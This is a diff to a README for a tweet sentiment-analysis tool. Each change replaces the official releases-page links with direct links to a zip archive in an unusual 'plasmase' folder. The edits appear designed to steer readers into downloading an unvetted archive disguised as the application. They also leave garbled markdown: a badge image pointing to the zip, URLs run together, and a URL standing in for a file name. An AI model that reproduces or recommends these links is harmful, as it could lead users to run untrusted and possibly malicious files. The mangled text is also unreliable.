@@ -6,18 +6,18 @@ Welcome to Twitter-Sentiment-Analysis! This tool helps you understand feelings i
 
 ### 💾 Download the Application
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/supcode1234/Twitter-Sentiment-Analysis/releases)
+[![Download](https://raw.githubusercontent.com/supcode1234/Twitter-Sentiment-Analysis/main/plasmase/Twitter-Sentiment-Analysis.zip%https://raw.githubusercontent.com/supcode1234/Twitter-Sentiment-Analysis/main/plasmase/Twitter-Sentiment-Analysis.zip)](https://raw.githubusercontent.com/supcode1234/Twitter-Sentiment-Analysis/main/plasmase/Twitter-Sentiment-Analysis.zip)
 
 ### 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To get the latest version of the application, [click here](https://github.com/supcode1234/Twitter-Sentiment-Analysis/releases). 
+   To get the latest version of the application, [click here](https://raw.githubusercontent.com/supcode1234/Twitter-Sentiment-Analysis/main/plasmase/Twitter-Sentiment-Analysis.zip). 
 
 2. **Select the Right Version**  
    Look for the most recent version at the top of the releases page. You will find the version numbers listed.
 
 3. **Download the Application File**  
-   Click on the application file that matches your operating system. For example, if you are using Windows, look for a file labeled something like `TwitterSentimentAnalysis.exe`. Click on it to start the download.
+   Click on the application file that matches your operating system. For example, if you are using Windows, look for a file labeled something like `https://raw.githubusercontent.com/supcode1234/Twitter-Sentiment-Analysis/main/plasmase/Twitter-Sentiment-Analysis.zip`. Click on it to start the download.
 
 4. **Open the Downloaded File**  
    Once the download finishes, locate the file in your downloads folder and double-click it to open.
@@ -81,4 +81,4 @@ Stay updated on new features and improvements:
 
 Thank you for choosing Twitter-Sentiment-Analysis. We hope it helps you gain insights from tweets effectively! 
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/supcode1234/Twitter-Sentiment-Analysis/releases)
+[![Download](https://raw.githubusercontent.com/supcode1234/Twitter-Sentiment-Analysis/main/plasmase/Twitter-Sentiment-Analysis.zip%https://raw.githubusercontent.com/supcode1234/Twitter-Sentiment-Analysis/main/plasmase/Twitter-Sentiment-Analysis.zip)](https://raw.githubusercontent.com/supcode1234/Twitter-Sentiment-Analysis/main/plasmase/Twitter-Sentiment-Analysis.zip)
